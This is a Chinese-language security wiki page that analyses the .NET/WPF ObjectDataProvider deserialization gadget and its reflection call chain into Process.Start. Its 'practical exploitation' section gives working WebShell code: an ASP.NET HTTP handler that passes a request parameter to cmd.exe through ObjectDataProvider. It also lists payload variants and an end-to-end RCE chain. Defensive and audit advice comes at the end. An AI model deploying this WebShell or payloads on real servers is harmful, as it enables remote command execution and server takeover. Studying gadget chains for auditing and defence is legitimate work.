---
title: .NET/WPF ObjectDataProvider 反序列化 Gadget 深度解析
description: 深度解析 .NET/WPF ObjectDataProvider 反序列化 Gadget 的生命周期、调用链原理及利用方式，含三种类型获取方法、Refresh/BeginQuery/InvokeMethodOnInstance
  调用栈详解，并演示基于 Process.Start 的 WebShell 实战变种
category: program-analysis
tags:
- .NET
- WPF
- ObjectDataProvider
- 反序列化
- Gadget Chain
- RCE
- WebShell
- PresentationFramework
- 代码审计
- 红队技术
date: '2024-01-15'
updated: '2026-11-15'
---

## 概述

**ObjectDataProvider** 类封装于 WPF 核心程序集 `PresentationFramework.dll` 中，是 .NET 反序列化漏洞利用链中的核心 Gadget 之一。其核心作用是将**非静态类实例化后的对象作为数据源提供给 WPF 控件绑定**。由于该类支持通过反射动态调用任意对象的任意方法并传递参数，攻击者可在反序列化场景下构造恶意载荷，实现远程代码执行（RCE）。

> 交叉引用：[[dotnet-xmlserializer-expandedwrapper-deserialization-gadget]] 同样深度解析 .NET 反序列化 Gadget 链，涵盖 `XmlSerializer` 与 `ExpandedWrapper`、`ObjectDataProvider`、`XamlReader` 组合利用的完整攻击链。

## 三种获取 Type 实例的方法

ObjectDataProvider 通过 `ObjectType` 属性（类型为 `System.Type`）指定目标类型。由于 `Type` 为抽象类无法直接 `new`，常用以下三种方式获取实例：

### `typeof` 操作符（编译期绑定）

```csharp
ObjectDataProvider objectDataProvider = new ObjectDataProvider()
{
    ObjectType = typeof(System.Diagnostics.Process)
};
objectDataProvider.MethodParameters.Add("calc");
objectDataProvider.MethodName = "Start";
```

- 优点：编译时类型安全，IntelliSense 支持
- 缺点：需引用目标程序集，不适合动态载荷构造

### `Type.GetType(string)`（运行期字符串解析）

```csharp
ObjectDataProvider objectDataProvider = new ObjectDataProvider()
{
    ObjectType = Type.GetType(
        "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        true,  // throwOnError
        true   // ignoreCase
    )
};
objectDataProvider.MethodParameters.Add("calc");
objectDataProvider.MethodName = "Start";
```

- 优点：完全由字符串驱动，适合序列化载荷嵌入；可指定程序集强名称（版本、PublicKeyToken）
- 缺点：需正确提供完全限定名，版本不匹配会抛异常

### `Object.GetType()`（实例反射获取）

```csharp
ObjectDataProvider objectDataProvider = new ObjectDataProvider()
{
    ObjectType = new System.Diagnostics.Process().GetType()
};
objectDataProvider.MethodParameters.Add("calc");
objectDataProvider.MethodName = "Start";
```

- 本质：`ObjectInstance` 属性内部实现同样调用 `value?.GetType()` 设置底层 `_objectType` 字段
- 适用场景：已有实例对象，需复用其类型信息

> 注意：`ObjectType` 与 `ObjectInstance` 互斥，二选一。源码中 `SetObjectInstance` 会调用 `SetObjectType(value?.GetType())`，并校验 `_mode` 防止同时设置。

## 生命周期与核心调用链

### 类继承关系

```
ObjectDataProvider → DataSourceProvider → DispatcherObject → DependencyObject → Object
```

### 关键方法调用栈

```text
Refresh()
  → BeginQuery() [virtual, 在 ObjectDataProvider 中重写]
    → QueryWorker() [内部线程池回调]
      → InvokeMethodOnInstance()
        → 反射调用 _objectType.GetMethod(MethodName).Invoke(target, MethodParameters.ToArray())
```

#### `Refresh()` 入口

```csharp
public void Refresh()
{
    this._initialLoadCalled = true;
    this.BeginQuery();
}
```

- 标记初始加载完成，触发异步查询流程

#### `BeginQuery()` 重写实现

```csharp
protected override void BeginQuery()
{
    // 捕获当前同步上下文，提交 QueryWorker 到线程池
    ThreadPool.QueueUserWorkItem(new WaitCallback(this.QueryWorker));
}
```

- WPF 数据绑定模型要求异步获取数据，避免阻塞 UI 线程

#### `QueryWorker()` 执行实际反射调用

```csharp
private void QueryWorker(object arg)
{
    // 1. 确定目标实例：_objectInstance 或 Activator.CreateInstance(_objectType)
    // 2. 通过反射获取 MethodInfo
    // 3. 调用 InvokeMethodOnInstance 执行
    this.InvokeMethodOnInstance();
}
```

#### `InvokeMethodOnInstance()` 核心反射执行

```csharp
private void InvokeMethodOnInstance()
{
    // 解析 MethodParameters 集合为 object[] objArray
    // 反射调用：
    //   _objectType.GetMethod(this._methodName, ...).Invoke(target, objArray)
}
```

- `MethodParameters` 内部为 `ParameterCollection : Collection<object>`，通过 `Add`/`InsertItem` 维护
- 最终将参数数组传递给 `MethodInfo.Invoke`，完成任意方法调用

### 属性设置触发刷新机制

| 属性 | Setter 逻辑 | 触发 Refresh 条件 |
|------|-------------|-------------------|
| `MethodName` | 设置 `_methodName`，调用 `OnPropertyChanged` | `!IsRefreshDeferred` 时立即 `Refresh()` |
| `ObjectInstance` | 校验模式冲突，调用 `SetObjectInstance` → `SetObjectType(value?.GetType())` | 同步刷新 |
| `ObjectType` | 直接赋值 `_objectType = newType` | 同步刷新 |

> `IsRefreshDeferred` 可通过 `DeferRefresh()`/`EndDeferRefresh()` 控制批量更新时的刷新时机。

## 实战利用：基于 Process.Start 的 WebShell 变种

### 核心执行载荷

```csharp
public static void CodeInject(string input)
{
    // Base64 编码绕过 URL 特殊字符限制
    string execCode = EncodeBase64("utf-8", input);
    
    ObjectDataProvider provider = new ObjectDataProvider()
    {
        ObjectInstance = new System.Diagnostics.Process()
    };
    
    // Process.Start(string fileName, string arguments)
    provider.MethodParameters.Add("cmd.exe");
    provider.MethodParameters.Add("/c " + DecodeBase64("utf-8", execCode));
    
    provider.MethodName = "Start";
}
```

### HTTP Handler 入口

```csharp
public void ProcessRequest(HttpContext context)
{
    context.Response.ContentType = "text/plain";
    if (!string.IsNullOrEmpty(context.Request["input"]))
    {
        CodeInject(context.Request["input"]);
        context.Response.Write("Status: 执行完毕！");
    }
    else
    {
        context.Response.Write("Usage: ?input=Base64EncodedCommand");
    }
}
```

### 变种：使用 `ObjectType` 替代 `ObjectInstance`

```csharp
ObjectDataProvider provider = new ObjectDataProvider()
{
    ObjectType = typeof(System.Diagnostics.Process)  // 或 Type.GetType(...)
};
provider.MethodParameters.Add("cmd.exe");
provider.MethodParameters.Add("/c calc");
provider.MethodName = "Start";
```

- 无需实例化 `Process` 对象，直接通过类型反射调用静态/实例方法
- 结合三种 Type 获取方式，可生成至少 **3×2=6 种** 载荷变体（Type 获取方式 × ObjectType/ObjectInstance 两种模式）

### 利用链总结

```
反序列化入口 (XamlReader.Load / BinaryFormatter / XmlSerializer 等)
    → ObjectDataProvider 对象图还原
    → 属性设置：ObjectType/ObjectInstance + MethodName + MethodParameters
    → 隐式/显式触发 Refresh()
    → 线程池异步执行 QueryWorker → InvokeMethodOnInstance
    → 反射调用 Process.Start("cmd.exe", "/c <attacker_command>")
    → RCE
```

## 防御与检测建议

1. **禁止不受信任的反序列化**
   - 避免 `XamlReader.Load`、`BinaryFormatter.Deserialize`、`XmlSerializer` 处理外部输入
   - 启用 `TypeNameHandling = None` (Json.NET) / 严格类型白名单

2. **Gadget 链清理**
   - 移除/禁用 `PresentationFramework.dll` 中 `ObjectDataProvider` 的公开序列化构造器（需框架级修复）
   - 使用 `SerializationBinder` 限制可反序列化类型

3. **运行时监控**
   - ETW 事件监控 `Process.Start` 异常父进程（如 `w3wp.exe`/`dotnet.exe` 启动 `cmd.exe`）
   - [[dotnet-clr-usage-log-tampering-edr-evasion]] 详述 .NET CLR 使用日志机制，可结合其检测异常程序集加载与反射调用

4. **代码审计关键点**
   - 搜索 `ObjectDataProvider` 实例化与属性赋值
   - 关注 `MethodName`、`MethodParameters`、`ObjectType`/`ObjectInstance` 受外部输入控制的场景
   - 检查 `Refresh()`/`DeferRefresh()` 调用链是否可被触发

## 相关技术页面

- [[dotnet-xmlserializer-expandedwrapper-deserialization-gadget]] — XmlSerializer 反序列化 Gadget 链完整分析，含 ObjectDataProvider 组合利用
- [[dotnet-clr-usage-log-tampering-edr-evasion]] — .NET CLR 使用日志原理与规避，可用于检测异常反射执行
- [[process-injection-tampering-techniques]] — 进程注入与篡改技术体系，关联 RCE 后的内存执行阶段
- [[cobalt-strike-4.7-bof-internals]] — Cobalt Strike BOF 实现细节，红队工具开发视角的 .NET 免杀对抗
- [[inceptor-av-edr-evasion-framework]] — Inceptor 框架集成 Donut/pe2shc/sRDI 等 .NET 内存执行技术

## 参考资料

- 原文：《.NET高级代码审计(第13课)反序列化Gadget之ObjectDataProvider完结篇》  
  <http://mp.weixin.qq.com/s?__biz=Mzg4Njc1MTIzMw==&mid=2247484651&idx=1&sn=279efbb8b93b66259ebd3cd766a138a4>
- Microsoft Docs: [ObjectDataProvider Class](https://learn.microsoft.com/en-us/dotnet/api/system.windows.data.objectdataprovider)
- .NET Reference Source: [ObjectDataProvider.cs](https://referencesource.microsoft.com/#PresentationFramework/MS/Internal/Data/ObjectDataProvider.cs)
- ysoserial.net: [ObjectDataProvider Gadget](https://github.com/pwntester/ysoserial.net/tree/master/ysoserial/Gadgets)

## 来源

- [0x6270安全团队-202203-202304_33](../sources/0x6270安全团队-202203-202304_33.md)
